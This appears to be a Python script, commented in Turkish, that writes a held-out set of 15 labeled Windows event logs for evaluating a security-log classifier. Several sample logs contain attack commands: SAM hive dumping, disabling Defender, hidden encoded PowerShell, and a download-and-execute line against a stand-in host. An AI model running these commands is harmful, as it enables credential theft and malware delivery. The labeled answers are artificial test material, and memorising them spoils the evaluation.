"""H kolu: 15 held-out log. YAZILDIKTAN SONRA BIR DAHA ACILMAZ.

BU KOL OLCULMEZ. Hat uzerinde calistirilmaz, ciktisina bakilmaz, hicbir
metrige katilmaz, hicbir esik buna bakilarak ayarlanmaz. Kullanici ayri
calistirir.

YAZILMA ANI KASITLI (2026-08-30): G kolu etiketlendikten SONRA, ama G
KOSULMADAN once. Yani bu dosya yazilirken elde HICBIR olcum sonucu yoktu.
Kullanicinin kurali "H, S'den once yazilsin" idi (yoksa H kacinilmaz olarak
S'nin golgesi olur); bir adim daha sikisi secildi -- H, G'nin sonucundan da
once. Boylece H ne S'nin golgesi ne de G'nin bosluklarinin aynasi.

ATT&CK v19.1 DOGRULAMASI: her ID bundle'a karsi sinaniyor; eksik ya da
revoked bir ID betigi DUSURUR. Bu kolu yazarken iki kez ise yaradi --
T1562.001 ve T1070.001'in ikisi de v19.1'de revoked (sirasiyla T1685 ve
T1685.005). Ezberden yazilsa iki gecersiz ID kaydedilecekti.

TEMSIL (uc kriter de karsilanacak sekilde secildi):
    olay ID cesitliligi : 4688, 4657, 1102, 7045, 4698, 4720, 4732,
                          4624, 4625, 4104, Sysmon 1, Sysmon 3
    registry aileleri   : credential-hive (critical), defender-policy (high),
                          service (high), autorun-run (high),
                          time-zone (noise)
    baseline cifti      : IKI YONLU --
                          H-03 beklenen cift (service <- TrustedInstaller/SYSTEM)
                          H-02 beklenmeyen cift (defender-policy <- ayni aktor)

    .venv/Scripts/python.exe scripts/build_h_arm_heldout.py

Cikti: evaluation/heldout_set.json
"""
from __future__ import annotations

import json
import pathlib
import sys

KOK = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(KOK))

from app.validation.validator import AttackKnowledgeBase  # noqa: E402

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CIKTI = KOK / "evaluation" / "heldout_set.json"

INSUFFICIENT = "INSUFFICIENT_DATA"
BENIGN = "SUFFICIENT_BENIGN"
SUSPICIOUS = "SUFFICIENT_SUSPICIOUS"

B = "\\"

LOGLAR: list[dict] = [
    {
        "id": "H-01",
        "event_id": "4688",
        "input": (
            "A new process has been created. Creator Subject: Security ID: "
            "CORP\\svc-backup Account Name: svc-backup Account Domain: CORP "
            "Logon ID: 0x8C112 Process Information: New Process ID: 0x1a2c "
            "New Process Name: C:\\Windows\\System32\\reg.exe Token Elevation "
            "Type: %%1937 Mandatory Label: Mandatory Label\\High Mandatory "
            "Level Creator Process ID: 0x8f4 Creator Process Name: "
            "C:\\Windows\\System32\\cmd.exe Process Command Line: reg.exe save "
            "HKLM\\SAM C:\\Users\\Public\\sam.hive"
        ),
        "expected_attack_ids": ["T1003.002"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Komut satiri SAM kovanini diske kaydediyor. Kritiklik: critical / "
            "credential-hive. Hedef C:\\Users\\Public, herkesin okuyabildigi "
            "bir konum. Kimlik bilgisi erisiminin ders kitabi ornegi."
        ),
        "attack_source": "T1003.002 Security Account Manager (v19.1, Credential Access)",
    },
    {
        "id": "H-02",
        "event_id": "4657",
        "input": (
            "A registry value was modified. Subject: Security ID: NT "
            "AUTHORITY\\SYSTEM Account Name: SYSTEM Account Domain: NT "
            "AUTHORITY Logon ID: 0x3E7 Object: Object Name: "
            "\\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows "
            "Defender Object Value Name: DisableAntiSpyware Handle ID: 0x2b8 "
            "Operation Type: New registry value created Process Information: "
            "Process ID: 0x4b0 Process Name: "
            "C:\\Windows\\servicing\\TrustedInstaller.exe Change Information: "
            "Old Value Type: - Old Value: - New Value Type: REG_DWORD New "
            "Value: 1"
        ),
        "expected_attack_ids": ["T1685"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "EK-2'nin BEKLENMEYEN yonu. Aktor (TrustedInstaller.exe/SYSTEM) "
            "baseline tablosunda VAR, ama yalnizca `service` ailesi icin. "
            "Burada `defender-policy` ailesine yaziyor. Bastirma AILE bazli "
            "oldugu icin BURADA ATESLENMEMELI -- ateslerse tablo aktor bazli "
            "davraniyor demektir ve bu tam olarak ayricalik yukseltmenin "
            "varis noktasindaki kor noktadir."
        ),
        "attack_source": (
            "T1685 Disable or Modify Tools (v19.1). NOT: T1562.001 v19.1'de "
            "REVOKED, yerine bu geldi -- bundle'a sorulmasaydi yanlis ID yazilirdi."
        ),
    },
    {
        "id": "H-03",
        "event_id": "4657",
        "input": (
            "A registry value was modified. Subject: Security ID: NT "
            "AUTHORITY\\SYSTEM Account Name: SYSTEM Account Domain: NT "
            "AUTHORITY Logon ID: 0x3E7 Object: Object Name: "
            "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\AcmeUpdater "
            "Object Value Name: ImagePath Handle ID: 0x1f4 Operation Type: New "
            "registry value created Process Information: Process ID: 0x4b0 "
            "Process Name: C:\\Windows\\servicing\\TrustedInstaller.exe Change "
            "Information: Old Value Type: - Old Value: - New Value Type: "
            "REG_EXPAND_SZ New Value: "
            "\"C:\\Program Files\\Acme\\AcmeUpdater.exe\""
        ),
        "expected_attack_ids": [],
        "expected_decision": BENIGN,
        "negative_case": True,
        "review_flag": False,
        "rationale": (
            "EK-2'nin BEKLENEN yonu ve H-02'nin ciftidir. Ayni aktor, ayni "
            "olay tipi, FARKLI varlik ailesi: `service`. Yeni bir servis "
            "kaydi olusturmak Windows Modules Installer'in tanimli isi. "
            "Bastirma BURADA atesleneli. H-02 ile birlikte okunmalari sart: "
            "yalnizca biri konursa tablonun fazla genis mi fazla dar mi "
            "oldugu gorulemez."
        ),
    },
    {
        "id": "H-04",
        "event_id": "4657",
        "input": (
            "A registry value was modified. Subject: Security ID: "
            "CORP\\attacker Account Name: attacker Account Domain: CORP Logon "
            "ID: 0x9A231 Object: Object Name: "
            "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run "
            "Object Value Name: SecurityUpdater Handle ID: 0x3c0 Operation "
            "Type: New registry value created Process Information: Process ID: "
            "0x2110 Process Name: "
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
            "Change Information: Old Value Type: - Old Value: - New Value "
            "Type: REG_SZ New Value: C:\\Users\\Public\\upd.exe"
        ),
        "expected_attack_ids": ["T1547.001"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Run anahtarina, kullanici yazabilir bir konumu (Users\\Public) "
            "isaret eden yeni deger. Kritiklik: high / autorun-run. Aktor "
            "baseline'da yok. Kaliciligin bir numarali yeri."
        ),
        "attack_source": "T1547.001 Registry Run Keys / Startup Folder (v19.1)",
    },
    {
        "id": "H-05",
        "event_id": "4657",
        "input": (
            "A registry value was modified. Subject: Security ID: NT "
            "AUTHORITY\\LOCAL SERVICE Account Name: LOCAL SERVICE Account "
            "Domain: NT AUTHORITY Logon ID: 0x3E5 Object: Object Name: "
            "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            "\\Time Zones\\Turkey Standard Time Object Value Name: TZI Handle "
            "ID: 0x8c Operation Type: Existing registry value modified Process "
            "Information: Process ID: 0x1b34 Process Name: "
            "C:\\Windows\\System32\\svchost.exe"
        ),
        "expected_attack_ids": [],
        "expected_decision": INSUFFICIENT,
        "negative_case": True,
        "review_flag": False,
        "rationale": (
            "EK-1'in `noise` ailesi. Saat dilimi verisi guncelleme; kritiklik "
            "tablosu bunu bilerek gurultu sayiyor. Yazma erisimi var ama "
            "varlik onemsiz -- Yol B'nin yalnizca kritikligi degil, "
            "kritikligin SEVIYESINI okudugunu sinar."
        ),
    },
    {
        "id": "H-06",
        "event_id": "1102",
        "input": (
            "The audit log was cleared. Subject: Security ID: CORP\\attacker "
            "Account Name: attacker Domain Name: CORP Logon ID: 0x9A231"
        ),
        "expected_attack_ids": ["T1685.005"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Denetim gunlugunun temizlenmesi. Tek basina bir olay ama kanit "
            "degeri yuksek: 1102 yalnizca gunluk silindiginde uretilir."
        ),
        "attack_source": (
            "T1685.005 Clear Windows Event Logs (v19.1). NOT: T1070.001 "
            "v19.1'de REVOKED, yerine bu geldi -- ikinci ezber tuzagi."
        ),
    },
    {
        "id": "H-07",
        "event_id": "7045",
        "input": (
            "A service was installed in the system. Service Name: SysHelper "
            "Service File Name: C:\\Users\\Public\\sh.exe Service Type: user "
            "mode service Service Start Type: auto start Service Account: "
            "LocalSystem"
        ),
        "expected_attack_ids": ["T1543.003"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "LocalSystem olarak otomatik baslayan, ikilisi Users\\Public'te "
            "duran bir servis. H-03 ile karsitligi kasitli: orada da servis "
            "kaydi yaziliyor ama aktor ve konum mesru."
        ),
        "attack_source": "T1543.003 Windows Service (v19.1)",
    },
    {
        "id": "H-08",
        "event_id": "4698",
        "input": (
            "A scheduled task was created. Subject: Security ID: "
            "CORP\\attacker Account Name: attacker Account Domain: CORP Logon "
            "ID: 0x9A231 Task Information: Task Name: "
            "\\Microsoft\\Windows\\UpdateOrchestrator\\SysUpd Task Content: "
            "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Triggers>"
            "<LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
            "<Actions><Exec><Command>powershell.exe</Command><Arguments>"
            "-WindowStyle Hidden -ExecutionPolicy Bypass -File "
            "C:\\ProgramData\\u.ps1</Arguments></Exec></Actions></Task>"
        ),
        "expected_attack_ids": ["T1053.005", "T1564.003"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Logon tetikleyicili zamanlanmis gorev, mesru bir gorev yolunu "
            "(UpdateOrchestrator) taklit ediyor ve gizli pencereyle PowerShell "
            "calistiriyor."
        ),
        "attack_source": (
            "T1053.005 Scheduled Task (v19.1). T1564.003 Hidden Window -- "
            "'-WindowStyle Hidden' teknigin kendi metninde birebir ornek. "
            "'-ExecutionPolicy Bypass' icin ATT&CK karsiligi YOK, gosterge "
            "olarak birakildi (bundle'da 'execution policy' hic gecmiyor)."
        ),
    },
    {
        "id": "H-09",
        "event_id": "4720",
        "input": (
            "A user account was created. Subject: Security ID: CORP\\attacker "
            "Account Name: attacker Account Domain: CORP Logon ID: 0x9A231 New "
            "Account: Security ID: CORP\\svc-temp Account Name: svc-temp "
            "Account Domain: CORP Attributes: SAM Account Name: svc-temp "
            "Display Name: <value not set> User Principal Name: - Home "
            "Directory: <value not set> Password Last Set: <never> Account "
            "Expires: <never>"
        ),
        "expected_attack_ids": ["T1136.001"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Yerel hesap olusturma. H-10 ile zincir olusturuyor (once hesap, "
            "sonra Administrators'a ekleme) ama iki AYRI log olarak duruyor -- "
            "korelasyon katmanini degil, tek olay eslestirmesini sinamak icin."
        ),
        "attack_source": "T1136.001 Local Account (v19.1, Persistence)",
    },
    {
        "id": "H-10",
        "event_id": "4732",
        "input": (
            "A member was added to a security-enabled local group. Subject: "
            "Security ID: CORP\\attacker Account Name: attacker Account "
            "Domain: CORP Logon ID: 0x9A231 Member: Security ID: "
            "CORP\\svc-temp Account Name: - Group: Security ID: "
            "BUILTIN\\Administrators Group Name: Administrators Group Domain: "
            "Builtin"
        ),
        "expected_attack_ids": ["T1098"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Yeni olusturulmus bir hesabin yerel Administrators grubuna "
            "eklenmesi. Ayricalik yukseltmenin dogrudan kaydi."
        ),
        "attack_source": "T1098 Account Manipulation (v19.1)",
    },
    {
        "id": "H-11",
        "event_id": "1",
        "input": (
            "Process Create: RuleName: - UtcTime: 2026-08-30 09:14:22.118 "
            "ProcessGuid: {a1b2c3d4-1122-6650-1a00-000000000900} ProcessId: "
            "8124 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
            "powershell.exe FileVersion: 10.0.20348.1 Description: Windows "
            "PowerShell Company: Microsoft Corporation OriginalFileName: "
            "PowerShell.EXE CommandLine: powershell.exe -nop -w hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA "
            "CurrentDirectory: C:\\Users\\attacker\\ User: CORP\\attacker "
            "LogonGuid: {a1b2c3d4-1122-6650-1a00-000000000900} LogonId: "
            "0x9A231 TerminalSessionId: 2 IntegrityLevel: High Hashes: "
            "SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F6 "
            "ParentProcessId: 6612 ParentImage: C:\\Windows\\System32\\cmd.exe "
            "ParentCommandLine: cmd.exe /c start /min powershell"
        ),
        "expected_attack_ids": ["T1059.001", "T1564.003"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Sysmon 1: kodlanmis (-enc) ve gizli pencereli (-w hidden) "
            "PowerShell. Yapisal alanlardan okunuyor (Image, CommandLine, "
            "User), duzyazi iddiadan degil."
        ),
        "attack_source": (
            "T1059.001 PowerShell (v19.1). T1564.003 Hidden Window -- '-w "
            "hidden' bayragi; teknik metni '-WindowStyle Hidden' ornegini "
            "veriyor, '-w' onun kisaltmasi."
        ),
    },
    {
        "id": "H-12",
        "event_id": "3",
        "input": (
            "Network connection detected: RuleName: - UtcTime: 2026-08-30 "
            "09:15:41.902 ProcessGuid: {a1b2c3d4-1122-6650-1a00-000000000a11} "
            "ProcessId: 4412 Image: C:\\Windows\\Temp\\a.exe User: "
            "CORP\\attacker Protocol: tcp Initiated: true SourceIsIpv6: false "
            "SourceIp: 198.51.100.185 SourceHostname: WINHOST-01 SourcePort: "
            "51322 DestinationIsIpv6: false DestinationIp: 203.0.113.24 "
            "DestinationHostname: - DestinationPort: 443 "
            "DestinationPortName: https"
        ),
        "expected_attack_ids": [],
        "expected_decision": INSUFFICIENT,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Windows\\Temp'teki bir ikilinin disariya 443 baglantisi. "
            "Konum supheli, ama tek bir baglanti kaydi hicbir teknigi "
            "KANITLAMAZ. Kasitli tuzak: 'korkutucu goruntu' ile 'kanit' "
            "ayrimini sinar. Dogru cevap teknik listesi BOS + inceleme."
        ),
        "attack_source": (
            "T1071.001 dusunuldu ve REDDEDILDI: protokolun kotuye "
            "kullanildigini gosteren hicbir sey yok, yalnizca https."
        ),
    },
    {
        "id": "H-13",
        "event_id": "4624",
        "input": (
            "An account was successfully logged on. Subject: Security ID: NULL "
            "SID Account Name: - Account Domain: - Logon ID: 0x0 Logon "
            "Information: Logon Type: 3 Restricted Admin Mode: - Virtual "
            "Account: No Elevated Token: No New Logon: Security ID: CORP\\jdoe "
            "Account Name: jdoe Account Domain: CORP Logon ID: 0x1A44E1 "
            "Network Information: Workstation Name: WS-014 Source Network "
            "Address: 198.51.100.62 Source Port: 49711 Detailed Authentication "
            "Information: Logon Process: NtLmSsp Authentication Package: NTLM "
            "Package Name (NTLM only): NTLM V2 Key Length: 128"
        ),
        "expected_attack_ids": [],
        "expected_decision": INSUFFICIENT,
        "negative_case": True,
        "review_flag": False,
        "rationale": (
            "Basarili ag oturumu (Type 3), NTLMv2, ic agdan bir is "
            "istasyonundan. Tek basina rutin. Negatif ornek."
        ),
    },
    {
        "id": "H-14",
        "event_id": "4625",
        "input": (
            "An account failed to log on. Subject: Security ID: NULL SID "
            "Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 "
            "Account For Which Logon Failed: Security ID: NULL SID Account "
            "Name: jdoe Account Domain: CORP Failure Information: Failure "
            "Reason: Unknown user name or bad password. Status: 0xC000006D Sub "
            "Status: 0xC000006A Network Information: Workstation Name: WS-014 "
            "Source Network Address: 198.51.100.62 Source Port: 49733"
        ),
        "expected_attack_ids": [],
        "expected_decision": INSUFFICIENT,
        "negative_case": True,
        "review_flag": False,
        "rationale": (
            "TEK basarisiz oturum denemesi. Kaba kuvvet TEKRAR gerektirir; "
            "tek olay onu kanitlamaz. Kasitli tuzak: 'basarisiz oturum' "
            "goren bir sistemin hemen T1110'a atlayip atlamadigini sinar."
        ),
        "attack_source": (
            "T1110 (Brute Force) dusunuldu ve REDDEDILDI: tek deneme, tekrar "
            "yok, farkli hesap denemesi yok."
        ),
    },
    {
        "id": "H-15",
        "event_id": "4104",
        "input": (
            "Creating Scriptblock text (1 of 1): $u='http://203.0.113.24/t.exe'; "
            "Invoke-WebRequest -Uri $u -OutFile C:\\Users\\Public\\t.exe; "
            "Start-Process C:\\Users\\Public\\t.exe ScriptBlock ID: "
            "7f3c1b90-2ad1-4c55-9d0e-1c2b3a4d5e6f Path: "
        ),
        "expected_attack_ids": ["T1059.001", "T1105"],
        "expected_decision": SUSPICIOUS,
        "negative_case": False,
        "review_flag": True,
        "rationale": (
            "Script block gunlugu: PowerShell disaridan ikili indirip "
            "calistiriyor. Indirme ve calistirma AYNI kayitta, yani cikarim "
            "degil kanit."
        ),
        "attack_source": (
            "T1059.001 PowerShell (v19.1). T1105 Ingress Tool Transfer "
            "(v19.1, Command and Control)."
        ),
    },
]


def main() -> int:
    if CIKTI.exists():
        raise SystemExit(
            f"{CIKTI.name} ZATEN VAR. Bu kol yazildiktan sonra bir daha "
            "acilmaz; ustune yazmak held-out olmasini bozar. Bilerek "
            "yeniliyorsan once dosyayi elle sil."
        )

    kb = AttackKnowledgeBase().by_id
    for kayit in LOGLAR:
        for tid in kayit["expected_attack_ids"]:
            t = kb.get(tid)
            if t is None:
                raise SystemExit(f"{kayit['id']}: {tid} v19.1 bundle'inda YOK")
            if t["revoked"]:
                raise SystemExit(
                    f"{kayit['id']}: {tid} REVOKED -> {t.get('revoked_by')}"
                )

    dagilim: dict[str, int] = {}
    for k in LOGLAR:
        dagilim[k["expected_decision"]] = dagilim.get(k["expected_decision"], 0) + 1

    CIKTI.write_text(
        json.dumps(
            {
                "_UYARI": (
                    "HELD-OUT. Bu dosya olculmez: hat uzerinde calistirilmaz, "
                    "ciktisina bakilmaz, hicbir metrige katilmaz, hicbir esik "
                    "buna bakilarak ayarlanmaz. Kullanici ayri calistirir."
                ),
                "_yazilma_ani": (
                    "G kolu etiketlendikten SONRA, G KOSULMADAN once "
                    "(2026-08-30). Yazilirken elde hicbir olcum sonucu yoktu."
                ),
                "_uretici": "scripts/build_h_arm_heldout.py",
                "attack_version": "19.1",
                "kayit_sayisi": len(LOGLAR),
                "karar_dagilimi": dagilim,
                "kayitlar": [
                    {**k, "attack_version": "19.1",
                     "labeled_without_running_pipeline": True}
                    for k in LOGLAR
                ],
            },
            ensure_ascii=False,
            indent=1,
        ),
        encoding="utf-8",
    )

    idler = sorted({k["event_id"] for k in LOGLAR})
    print(f"{len(LOGLAR)} held-out log yazildi -> {CIKTI.relative_to(KOK)}")
    print(f"  karar dagilimi : {dagilim}")
    print(f"  olay ID        : {len(idler)} essiz {idler}")
    print(f"  negatif ornek  : {sum(1 for k in LOGLAR if k['negative_case'])}/{len(LOGLAR)}")
    print("  ATT&CK         : tum ID'ler v19.1'de var ve revoked degil")
    print("\n  BU DOSYA BIR DAHA ACILMAZ.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
